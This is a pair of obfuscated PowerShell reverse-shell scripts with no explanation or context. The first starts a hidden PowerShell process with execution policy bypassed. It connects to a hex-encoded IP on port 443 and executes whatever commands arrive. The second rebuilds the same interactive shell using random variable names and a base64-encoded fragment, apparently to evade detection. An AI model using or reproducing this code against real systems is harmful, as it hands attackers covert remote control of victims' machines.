Start-Process $PSHOME\powershell.exe -ArgumentList {-ep bypass -nop while($true){$LtL2FroOeC = New-Object System.Net.Sockets.TCPClient('0xc0a8012f',0x1bb);$PSg8bnJHVA = $LtL2FroOeC.GetStream();[byte[]]$GJ6xmhmWWB = 0..65535|%{0};while(($p7fgK1kyTx = $PSg8bnJHVA.Read($GJ6xmhmWWB, 0, $GJ6xmhmWWB.Length)) -ne 0){;$ZYeNsO71Fi = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($GJ6xmhmWWB,0, $p7fgK1kyTx);$VtoprMIERd = (i''ex $ZYeNsO71Fi 2>&1 | Out-String );$VpiZOkn9gG = $VtoprMIERd + '#> ';$zmVzGA9XE0 = ([text.encoding]::ASCII).GetBytes($VpiZOkn9gG);$PSg8bnJHVA.Write($zmVzGA9XE0,0,$zmVzGA9XE0.Length);$PSg8bnJHVA.Flush()};$LtL2FroOeC.Close()}} -WindowStyle Hidden
function Get-RandomString { param ([int]$length = 8) -join ((65..90) + (97..122) | Get-Random -Count $length | % {[char]$_}) } $var1 = Get-RandomString; $var2 = Get-RandomString; $var3 = Get-RandomString; $var4 = Get-RandomString; $var5 = Get-RandomString; $var6 = Get-RandomString; $var7 = Get-RandomString; $var8 = Get-RandomString; $var9 = Get-RandomString; $var10 = Get-RandomString; Set-Variable -Name $var1 -Value '0xc0a8012f'; Set-Variable -Name $var2 -Value 0x1bb; function $($var3) { $encoded = "JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCkKJHdyaXRlciA9IE5ldy1PYmplY3QgU3lzdGVtLklPLlN0cmVhbVdyaXRlcigkc3RyZWFtKQokcmVhZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uU3RyZWFtUmVhZGVyKCRzdHJlYW0pCg=="; Set-Variable -Name $var10 -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))); Invoke-Expression (Get-Variable -Name $var10).Value } function $($var4) { param ($ip, $port) try { $client = New-Object System.Net.Sockets.TCPClient($ip, $port); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $reader = New-Object System.IO.StreamReader($stream); return @($client, $stream, $writer, $reader) } catch { Write-Error "Connexion échouée"; exit } } function $($var5) { param ($client, $stream, $writer, $reader) while ($true) { $writer.Write((pwd).Path + "> "); $writer.Flush(); $command = $reader.ReadLine(); if ($command -eq "exit") { break }; $output = Invoke-Expression -Command $command 2>&1 | Out-String; $writer.WriteLine($output); $writer.Flush() } $client.Close() } $($var3); $conn = $($var4) -ip (Get-Variable -Name $var1).Value -port (Get-Variable -Name $var2).Value; $($var5) -client $conn[0] -stream $conn[1] -writer $conn[2] -reader $conn[3]
